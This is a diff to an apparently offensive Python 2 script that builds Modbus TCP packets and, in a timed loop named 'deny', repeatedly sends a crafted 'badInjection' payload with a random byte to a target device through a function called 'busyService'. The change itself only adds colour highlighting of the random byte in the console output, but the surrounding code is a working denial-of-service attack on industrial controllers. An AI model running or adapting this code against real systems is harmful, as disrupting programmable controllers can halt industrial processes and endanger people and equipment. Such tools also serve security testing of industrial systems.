@@ -62,6 +62,18 @@ class Colors:
     BOLD 		= '\033[1m'
     BR_COLOUR 	= '\033[1;37;40m'
 
+
+def rand_color(bit):
+	
+	color_array = [Colors.BLUE, Colors.GREEN, Colors.RED, Colors.WHITE]
+
+	rcolor = random.randint(0,3)
+
+	return color_array[rcolor] + bit + Colors.ORANGE
+
+
+
+
 def create_header_modbus(length,unit_id):
     trans_id = "4462"#hex(random.randrange(0000,65535))[2:].zfill(4)  -> dejo transaccion fija
     proto_id = "0000"
@@ -70,7 +82,7 @@ def create_header_modbus(length,unit_id):
 
     return trans_id + proto_id + protoLen + unit_id.zfill(2)
 
-def busyService(pduInjection):
+def busyService(pduInjection, randBits):
 
 	_result = ""
 
@@ -92,8 +104,11 @@ def busyService(pduInjection):
 		print " [!] No Conecta: "
 		print e		
 
+	# change color of random bit
+	rand_bit = rand_color(reqst[1][10:-2])
+
 	mb_stopConection = MB_Request.decode('hex')
-	_result += Colors.GREEN+" [+] Sent: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1]+Colors.DEFAULT+"\n"
+	_result += Colors.GREEN+" [+] Sent: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1][:-4]+Colors.DEFAULT+rand_bit+"00"+Colors.DEFAULT+"\n"
 	client.send(mb_stopConection) 
 	
 	try:
@@ -139,9 +154,10 @@ def deny(total_seconds, interval):
 
 		# Check to see if remaining time and interval mod to 0, if so, send request!
 		if total_seconds % interval == 0:
+			result = ""
 			secuenceRnd = (hex(random.randrange(00,255))[2:]).zfill(2)
 			badInjection = "5a01340001"+str(secuenceRnd)+"00"
-			result += busyService(badInjection)
+			result += busyService(badInjection, secuenceRnd)
 		
 
 deny(_total_seconds, _interval)
